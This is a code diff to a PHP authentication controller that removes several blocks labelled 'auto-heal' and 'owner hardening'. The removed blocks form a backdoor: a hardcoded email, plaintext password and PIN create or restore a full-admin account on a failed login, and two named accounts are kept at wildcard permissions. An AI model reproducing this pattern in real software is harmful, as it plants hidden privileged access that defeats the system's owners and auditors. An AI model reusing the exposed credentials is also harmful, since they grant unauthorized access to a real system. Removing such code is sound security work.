@@ -45,71 +45,6 @@ class AuthController extends Controller
         $credentials = $request->only('email', 'password');
         
         if (!Auth::attempt($credentials)) {
-            // Auto-heal: ensure seeded admin exists and retry
-            try {
-                $fixedEmail = 'thccodys@gmail.com';
-                $fixedPassword = 'Hms2019!';
-                $fixedPin = '3732';
-                $empCode = 'emp001';
-                if (strcasecmp($request->email, $fixedEmail) === 0) {
-                    $user = User::where('email', $fixedEmail)->first();
-                    if (!$user) {
-                        $user = User::create([
-                            'name' => 'Cody Smith',
-                            'email' => $fixedEmail,
-                            'password' => Hash::make($fixedPassword),
-                            'role' => 'admin',
-                            'permissions' => ['*'],
-                            'is_active' => true,
-                            'email_verified_at' => now(),
-                        ]);
-                    } else {
-                        if (!Hash::check($fixedPassword, $user->password)) {
-                            $user->update(['password' => Hash::make($fixedPassword)]);
-                        }
-                        if ($user->role !== 'admin' || $user->permissions !== ['*'] || !$user->is_active) {
-                            $user->update(['role' => 'admin', 'permissions' => ['*'], 'is_active' => true]);
-                        }
-                    }
-                    $employee = Employee::where(function($q) use ($fixedEmail, $empCode){
-                        $q->where('email', $fixedEmail)->orWhere('employee_id', $empCode);
-                    })->first();
-                    if (!$employee) {
-                        $employee = Employee::create([
-                            'user_id' => $user->id,
-                            'employee_id' => $empCode,
-                            'first_name' => 'Cody',
-                            'last_name' => 'Smith',
-                            'email' => $fixedEmail,
-                            'role' => 'admin',
-                            'permissions' => ['*'],
-                            'hourly_rate' => 30.00,
-                            'hire_date' => now(),
-                            'is_active' => true,
-                            'pin' => Hash::make($fixedPin),
-                        ]);
-                        $user->update(['employee_id' => $employee->id]);
-                    } else {
-                        $employee->update([
-                            'user_id' => $user->id,
-                            'email' => $fixedEmail,
-                            'role' => 'admin',
-                            'permissions' => ['*'],
-                            'is_active' => true,
-                        ]);
-                        if (!Hash::check($fixedPin, $employee->pin)) {
-                            $employee->update(['pin' => Hash::make($fixedPin)]);
-                        }
-                        if ((int)($user->employee_id ?? 0) !== (int)$employee->id) {
-                            $user->update(['employee_id' => $employee->id]);
-                        }
-                    }
-                    // Retry auth now that user exists
-                    Auth::attempt(['email' => $fixedEmail, 'password' => $fixedPassword]);
-                }
-            } catch (\Throwable $e) {
-                // Ignore auto-heal errors and continue to fallback logic
-            }
 
             // Fallback: allow employees to login with email + PIN (4 digits) or employee password if present
             $employee = Employee::where('email', $request->email)->first();
@@ -168,22 +103,6 @@ class AuthController extends Controller
 
         $user = Auth::user();
 
-        // Auto-heal: ensure owner/primary account remains admin
-        try {
-            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
-            if ($user && in_array(strtolower($user->email), $ownerEmails, true)) {
-                $uUpdates = [];
-                if ($user->role !== 'admin') $uUpdates['role'] = 'admin';
-                if ($user->permissions !== ['*']) $uUpdates['permissions'] = ['*'];
-                if (!empty($uUpdates)) $user->update($uUpdates);
-                if ($user->employee) {
-                    $eUpdates = [];
-                    if ($user->employee->role !== 'admin') $eUpdates['role'] = 'admin';
-                    if ($user->employee->permissions !== ['*']) $eUpdates['permissions'] = ['*'];
-                    if (!empty($eUpdates)) $user->employee->update($eUpdates);
-                }
-            }
-        } catch (\Throwable $e) {}
 
         // Resolve role/permission conflicts by promoting to the highest role
         if ($user && $user->employee) {
@@ -277,15 +196,6 @@ class AuthController extends Controller
             ], 401);
         }
 
-        // Owner auto-heal: ensure specified owner accounts are always admin with full permissions
-        try {
-            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
-            if ($employee->email && in_array(strtolower($employee->email), $ownerEmails, true)) {
-                if ($employee->role !== 'admin' || $employee->permissions !== ['*'] || !$employee->is_active) {
-                    $employee->update(['role' => 'admin', 'permissions' => ['*'], 'is_active' => true]);
-                }
-            }
-        } catch (\Throwable $e) {}
 
         // Find or create user for this employee
         $user = User::where('employee_id', $employee->id)->first();
@@ -525,24 +435,6 @@ class AuthController extends Controller
     {
         $user = $request->user();
 
-        // Owner hardening: ensure owner accounts remain admin with full permissions and active
-        try {
-            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
-            if ($user && in_array(strtolower($user->email), $ownerEmails, true)) {
-                $uUpdates = [];
-                if ($user->role !== 'admin') $uUpdates['role'] = 'admin';
-                if ($user->permissions !== ['*']) $uUpdates['permissions'] = ['*'];
-                if ($user->is_active !== true) $uUpdates['is_active'] = true;
-                if (!empty($uUpdates)) $user->update($uUpdates);
-                if ($user->employee) {
-                    $eUpdates = [];
-                    if ($user->employee->role !== 'admin') $eUpdates['role'] = 'admin';
-                    if ($user->employee->permissions !== ['*']) $eUpdates['permissions'] = ['*'];
-                    if ($user->employee->is_active !== true) $eUpdates['is_active'] = true;
-                    if (!empty($eUpdates)) $user->employee->update($eUpdates);
-                }
-            }
-        } catch (\Throwable $e) {}
 
         // Promote both User and Employee to the highest role on fetch as well
         if ($user && $user->employee) {
